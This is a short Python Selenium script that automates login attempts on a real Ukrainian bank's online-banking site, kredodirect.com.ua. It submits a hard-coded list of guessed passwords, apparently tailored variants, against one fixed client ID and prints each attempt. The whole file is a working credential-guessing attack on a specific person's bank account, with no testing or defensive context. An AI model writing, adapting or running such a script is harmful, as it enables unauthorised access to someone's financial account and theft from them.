import random
from selenium import webdriver

#Following are optional required
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException

baseurl = "https://www.kredodirect.com.ua/web"
l=['PkbnmczRjit5','PkbnmczRjityz5','CwerjFwrtqPkjv5','CwerjFwrtqPkjv','CwerjFwrtqDpkjv5','RjityzdUybdb7952','RjityznrjDuybdb5','PkbnmczRjit7952'
   , 'RjityznrjdUybdb5', 'RjityzdUybdb5', 'CwerjFwrtqDpkjv5', 'CwerjFwrtqPkjv5','CwerjFwrtqPkjv','RjityznrjdUybdb5', 'RjityznrjdUybdb5','PkbnmczRjit5'
   , 'Mafiaboyy!5', 'Mafiaboy!5', 'Mafiaboyy5!', 'Mafiaboyy5', 'Mafiaboyy7952', 'RjityzdUybdb5', 'PkbnmczRjit5']

xpaths = { 'usernameTxtBox' : '//input[@id="client_id"]',
           'passwordTxtBox' : "//input[@id='password']",
           'submitButton' :   '//input[@title="OK"]',
           'back' : '//input[@name="mnu_service_end"]',

         }

mydriver = webdriver.Chrome()
mydriver.get(baseurl)
mydriver.maximize_window()



for el in l:
    try:
        mydriver.find_element_by_xpath(xpaths['usernameTxtBox']).is_displayed()

        mydriver.find_element_by_xpath(xpaths['usernameTxtBox']).send_keys(11095161)
        mydriver.find_element_by_xpath(xpaths['passwordTxtBox']).send_keys(el)
        print el
        mydriver.find_element_by_xpath(xpaths['submitButton']).click()
    except:

        mydriver.find_element_by_xpath(xpaths['back']).click()
        print el
